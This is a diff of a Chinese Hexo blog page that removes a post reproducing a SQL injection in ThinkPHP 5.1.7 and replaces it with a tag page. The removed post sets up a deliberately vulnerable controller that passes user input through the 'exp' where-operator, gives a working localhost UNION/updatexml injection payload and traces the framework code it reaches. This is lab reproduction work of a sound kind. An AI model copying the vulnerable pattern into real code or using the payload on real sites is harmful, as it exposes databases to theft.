@@ -7,35 +7,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>ThinkPHP5漏洞复现-3 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
+  <title>Tag: 随笔 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="我是真的菜">
-<meta name="keywords" content="代码审计,tp5">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP5漏洞复现-3">
-<meta property="og:url" content="https://glotozz.github.io/2019/10/05/ThinkPHP5漏洞复现-3/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
+<meta property="og:url" content="https://glotozz.github.io/tags/随笔/index.html">
 <meta property="og:site_name" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
-<meta property="og:description" content="我是真的菜">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/zRuTrvbkaVG9JgM.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/QjAhugCWN7Uq3Sb.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/iIZnA8logOTHCK6.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/UwkIAeHOBVX6N8f.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/ZQB19McEksl7pUR.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/BTyvhteAFMzodUR.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/ghTvmO9G7PHWe8z.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/K12lc9kG7y5ZpMJ.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/Ef1qvM3dGuRpFS2.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/lXQtZUR9SrI1pFy.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/wUsml62R9VPegWz.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/05/FIYvBuTslNn8dcM.png">
-<meta property="og:updated_time" content="2019-10-05T10:24:17.144Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ThinkPHP5漏洞复现-3">
-<meta name="twitter:description" content="我是真的菜">
-<meta name="twitter:image" content="https://i.loli.net/2019/10/05/zRuTrvbkaVG9JgM.png">
+<meta name="twitter:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -163,274 +145,59 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-ThinkPHP5漏洞复现-3" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 class="article-title" itemprop="name">
-      ThinkPHP5漏洞复现-3
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/10/17/随笔-1/" class="archive-article-date">
+  	<time datetime="2019-10-17T03:43:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-17</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/10/17/随笔-1/">随笔</a>
     </h1>
   
 
-        
-        <a href="/2019/10/05/ThinkPHP5漏洞复现-3/" class="archive-article-date">
-  	<time datetime="2019-10-05T02:40:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-05</time>
-</a>
-        
-      </header>
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>我是真的菜</p>
-</blockquote>
- <meta name="referrer" content="no-referrer">
-<a id="more"></a>
-
-<h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>ThinkPHP5全版本</p>
-<p>获取测试环境代码(我以tp5.1.7为例)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.* tpdemo</span><br></pre></td></tr></table></figure>
-
-<p>修改<strong>composer.json</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">        &quot;php&quot;: &quot;&gt;=5.6.0&quot;,</span><br><span class="line">        &quot;topthink/framework&quot;: &quot;v5.1.7&quot;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/10/05/zRuTrvbkaVG9JgM.png" alt="Snipaste_2019-10-05_09-11-12.png"></p>
-<p>修改<strong>application/index/controller/Index.php</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username&apos;);</span><br><span class="line">        $result = db(&apos;users&apos;)-&gt;where(&apos;username&apos;,&apos;exp&apos;,$username)-&gt;select();</span><br><span class="line">        return &apos;select success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">	id int primary key auto_increment,</span><br><span class="line">	username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&apos;sk&apos;);</span><br></pre></td></tr></table></figure>
-
-<h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><blockquote>
-<p>由于官方根本不认为这是一个漏洞，而认为这是他们提供的一个功能，所以并没有修复。。。跟着七月火师傅学习一下</p>
-</blockquote>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tpdemo/public/index.php/Index/index?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/10/05/QjAhugCWN7Uq3Sb.png" alt="Snipaste_2019-10-05_11-04-21.png"></p>
-<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
-<p>还是跟着师傅的思路</p>
-</blockquote>
-<p>由payload分析漏洞触发，</p>
-<p>首先Request的get()方法会调用input()方法，但是默认不使用filter()</p>
-<p><img src="https://i.loli.net/2019/10/05/iIZnA8logOTHCK6.png" alt="Snipaste_2019-10-05_11-07-21.png"></p>
-<p><img src="https://i.loli.net/2019/10/05/UwkIAeHOBVX6N8f.png" alt="Snipaste_2019-10-05_11-08-24.png"></p>
-<p>所以对payload没啥影响</p>
-<p>调用Query类的where()方法</p>
-<p><img src="https://i.loli.net/2019/10/05/ZQB19McEksl7pUR.png" alt="Snipaste_2019-10-05_11-11-53.png"></p>
-<blockquote>
-<p>老是忘记画圈把代码框起来😓</p>
-</blockquote>
-<p>跟踪parseWhereExp()，也没啥过滤</p>
-<p>接着是调用Query类的select()</p>
-<p><img src="https://i.loli.net/2019/10/05/BTyvhteAFMzodUR.png" alt="Snipaste_2019-10-05_11-18-45.png"></p>
-<p>跟踪Connection.php中的select()</p>
-<p><img src="https://i.loli.net/2019/10/05/ghTvmO9G7PHWe8z.png" alt="Snipaste_2019-10-05_11-20-20.png"></p>
-<p>继续跟踪</p>
-<p><img src="https://i.loli.net/2019/10/05/K12lc9kG7y5ZpMJ.png" alt="Snipaste_2019-10-05_11-21-31.png"></p>
-<p>跟进parseWhere</p>
-<p><img src="https://i.loli.net/2019/10/05/Ef1qvM3dGuRpFS2.png" alt="Snipaste_2019-10-05_11-25-09.png"></p>
-<p>跟进buildWhere(),这个方法有点长，理解代码估计要很长时间。。。直接调试把😁</p>
-<p>发现进入parseWhereItem()</p>
-<p><img src="https://i.loli.net/2019/10/05/lXQtZUR9SrI1pFy.png" alt="Snipaste_2019-10-05_11-30-55.png"></p>
-<p>追踪</p>
-<p><img src="https://i.loli.net/2019/10/05/wUsml62R9VPegWz.png" alt="Snipaste_2019-10-05_11-38-55.png"></p>
-<p>发现进入parseExp()</p>
-<p><img src="https://i.loli.net/2019/10/05/FIYvBuTslNn8dcM.png" alt="Snipaste_2019-10-05_11-40-00.png"></p>
-<p>会将%WHERE%进行替换为parseExp()后的值</p>
-<p>即</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( `username` ) union select updatexml(1,concat(0x7,user(),0x7e),1)# )</span><br></pre></td></tr></table></figure>
-
-<p>完整sql</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE  ( `username` ) union select updatexml(1,concat(0x7,user(),0x7e),1)# )</span><br></pre></td></tr></table></figure>
-
-<h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><p>未修复</p>
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5漏洞分析之SQL注入3/#漏洞分析" target="_blank" rel="noopener">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p>
-
-      
-
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-
-      
-      <div>
-        <ul class="post-copyright">
-          <li class="post-copyright-author">
-          <strong>作者:  </strong>glotozz</a>
-          </li>
-          <li class="post-copyright-link">
-          <strong>文章链接:  </strong>
-          <a href="/2019/10/05/ThinkPHP5漏洞复现-3/" target="_blank" title="ThinkPHP5漏洞复现-3">https://glotozz.github.io/2019/10/05/ThinkPHP5漏洞复现-3/</a>
-          </li>
-          <li class="post-copyright-license">
-            <strong>版权声明:   </strong>
-            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
-            许可协议。转载请注明出处!
-          </li>
-        </ul>
-      <div>
-      
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp5</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/10/05/ThinkPHP5漏洞复现-3/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2019/10/05/ThinkPHP5漏洞复现-4/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ThinkPHP5漏洞复现-4
-        
-      </div>
-    </a>
   
   
-    <a href="/2019/10/04/ThinkPHP5漏洞复现-2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">ThinkPHP5漏洞复现-2</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -457,9 +224,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
